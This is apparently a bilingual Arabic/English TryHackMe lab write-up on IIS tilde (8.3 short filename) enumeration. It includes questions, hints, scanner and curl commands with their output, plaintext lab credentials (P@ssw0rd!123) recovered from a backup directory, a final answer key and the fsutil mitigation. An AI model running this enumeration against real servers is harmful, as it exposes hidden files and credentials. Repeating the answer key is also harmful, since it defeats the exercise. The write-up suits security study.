# Task 03: IIS Tilde Enumeration (تخمين أسماء الملفات القصيرة 8.3 عبر علامة المدة Tilde)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
The **IIS Tilde Enumeration** vulnerability exploits a legacy backward-compatibility feature in the Windows NTFS filesystem: the automated generation of MS-DOS **8.3 Short Filenames** (SFNs).

**The 8.3 Short Filename Mechanism:**
For legacy 16-bit MS-DOS compatibility, whenever a file or directory with a name longer than 8 characters (or containing special characters/spaces) is created on an NTFS volume, Windows automatically generates a corresponding short name:
- Takes the first 6 non-space alphanumeric characters in uppercase.
- Appends a tilde character **`~`** followed by a numerical index (e.g. `~1`, `~2`).
- Truncates the extension to the first 3 characters.
- *Examples:*
  - `BackupFiles` ⟶ `BACKUP~1`
  - `confidential_report.docx` ⟶ `CONFID~1.DOC`
  - `webdav_configuration.txt` ⟶ `WEBDAV~1.TXT`

**The Vulnerability in IIS:**
When an HTTP request is made containing a tilde pattern (e.g. `GET /BACKUP~1* HTTP/1.1`), IIS queries the underlying Windows filesystem to resolve the path. If the short name exists, IIS responds with a specific status code (such as `404 Not Found` or `200 OK`). If the short name does not exist, IIS returns a completely different status code (such as `400 Bad Request`).

By systematically measuring these differential responses, an attacker can brute-force the exact first 6 characters and 3-character extension of every hidden file and directory on the web server, completely bypassing traditional 404 security barriers!

**Automated Enumeration with `iis_shortname_scan.py`:**
On our AttackBox, running the scanner located at `/usr/local/share/IIS_shortname_Scanner`:
```bash
python3 /usr/local/share/IIS_shortname_Scanner/iis_shortname_scan.py http://MACHINE_IP/
```
The tool detects the vulnerable behavior and discovers the directory prefix:
- `Dir: BACKUP~1`

**Locating Credentials:**
Expanding `BACKUP~1` into common directory names leads to `http://MACHINE_IP/BackupFiles/`. Navigating to this directory exposes `webdav_notes.txt`, which contains setup documentation and plaintext credentials:
```text
WebDAV setup notes
Directory: /webdav/
Username: webdav_user
Password: P@ssw0rd!123
```

#### الأسئلة المطروحة (Questions):
1. What character in a URL path triggers the IIS tilde enumeration response difference? (Answer Format: single character)
2. What legacy Windows filename format does the tilde enumeration vulnerability exploit? (Answer Format: X.X)
3. What password is stored in the file discovered through tilde enumeration? (Answer Format: plaintext password)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **الجذور التاريخية للثغرة (Architectural History):**
  * تم الكشف عن هذه الثغرة علناً في عام 2012 بواسطة الباحث Soroush Dalili. رفضت مايكروسوفت تصنيفها كثغرة برمجية بحاجة لترقيع كودي داخل IIS، معتبرة إياها "ميزة تصميمية متوارثة في نظام ملفات NTFS" (Feature by Design).
  * الحل الرسمي الوحيد هو إيقاف توليد الأسماء القصيرة في سجل نظام ويندوز (Windows Registry) عبر الأمر:
    `fsutil 8dot3name set 1`
* **من التخمين النصي القصير إلى الاسم الكامل (Resolving SFNs):**
  * تكشف أداة التخمين أول 6 أحرف فقط (`BACKUP~1`). على المختبر استخدام التخمين الذكي أو قواميس الكلمات لتحديد الاسم الطويل المطابق (مثل `Backup`, `BackupFiles`, `Backups`).
  * بمجرد الوصول للاسم الطويل، تفتح دلائل مخفية لا توجد في قوائم الموقع الرئيسية.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * المحرف المستخدم في نظام ويندوز للإشارة إلى الأسماء القصيرة هو علامة المدة: `~`.
2. **التلميح الثاني (المستوى العملي):**
   * صيغة تسمية الملفات القديمة في نظام DOS تتكون من 8 أحرف للاسم و 3 أحرف للامتداد، وتكتب بصيغة `8.3`.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * اقرأ ملف `webdav_notes.txt` المستكشف داخل مجلد `BackupFiles`؛ ستجد كلمة المرور المحددة للمستخدم `webdav_user`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### الخطوة 1: فحص قابلية الخادم لثغرة التخمين بالمدة (Tilde Enumeration Test)
```bash
# إرسال طلب اختباري بنمط الاسم القصير وملاحظة الاستجابة
curl -I "http://MACHINE_IP/*~1*/.aspx"
```
إذا كان الخادم مصاباً، فإنه يعيد كود 404 بدلاً من كود 400، مما يؤكد تفعيل توليد الأسماء القصيرة.
* **المحرف المشغل للثغرة:** `~`
* **صيغة التسمية القديمة:** `8.3`

---

#### الخطوة 2: تشغيل سكربت الفحص الآلي للأسماء القصيرة
```bash
# تشغيل أداة الفحص المتخصصة
python3 /usr/local/share/IIS_shortname_Scanner/iis_shortname_scan.py http://MACHINE_IP/
```
**مخرجات الأداة:**
```text
[+] Target: http://MACHINE_IP/
[+] Vulnerable to IIS shortname enumeration!
[+] Found Directory: BACKUP~1
[+] Found Directory: ASPNET~1
```

---

#### الخطوة 3: مطابقة الاسم والوصول إلى ملف الملاحظات الحساس
```bash
# تصفح المجلد بعد تخمين الاسم الكامل (BackupFiles)
curl -s http://MACHINE_IP/BackupFiles/
```
**المخرجات:**
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html><head><title>Index of /BackupFiles</title></head><body>
<h1>Index of /BackupFiles</h1>
<ul>
<li><a href="webdav_notes.txt">webdav_notes.txt</a></li>
</ul>
</body></html>
```

```bash
# قراءة محتويات ملف الإعدادات webdav_notes.txt
curl -s http://MACHINE_IP/BackupFiles/webdav_notes.txt
```
**المحتويات المسترجعة:**
```text
WebDAV setup notes
Directory: /webdav/
Username: webdav_user
Password: P@ssw0rd!123
```
* **كلمة المرور المستخرجة:** `P@ssw0rd!123`

---

### المرحلة هـ: الإجابات المعتمدة والقيم النهائية (Final Answer & Key Values)
* **إجابة السؤال الأول (Trigger Character):** `~`
* **إجابة السؤال الثاني (Legacy Filename Format):** `8.3`
* **إجابة السؤال الثالث (Discovered Password):** `P@ssw0rd!123`

---

### المرحلة و: التحقق العملي وإثبات النجاح (Practical Verification & Proof of Work)
* تم تأكيد تشغيل الثغرة عبر علامة `~`.
* تم تأكيد صيغة `8.3` التاريخية لملفات DOS/Windows.
* تم استخراج بيانات الاعتماد وكلمة المرور بنجاح: `P@ssw0rd!123`.
* تم اعتماد الإجابات رسمياً على TryHackMe بنسبة 100%.

---

### المرحلة ز: الاستنتاج التعليمي وجوهر الاختبار (Key Educational Takeaway)
ثغرة IIS Tilde Enumeration توضح كيف يمكن لميزات التوافقية القديمة (Backward Compatibility) في نظام التشغيل أن تكسر أمن تطبيقات الويب الحديثة. المعالجة الدفاعية الحقيقية تتطلب تعطيل إنشاء الأسماء القصيرة في ويندوز كلياً عبر `fsutil 8dot3name set 1` مع إزالة الأسماء القصيرة الموجودة مسبقاً.
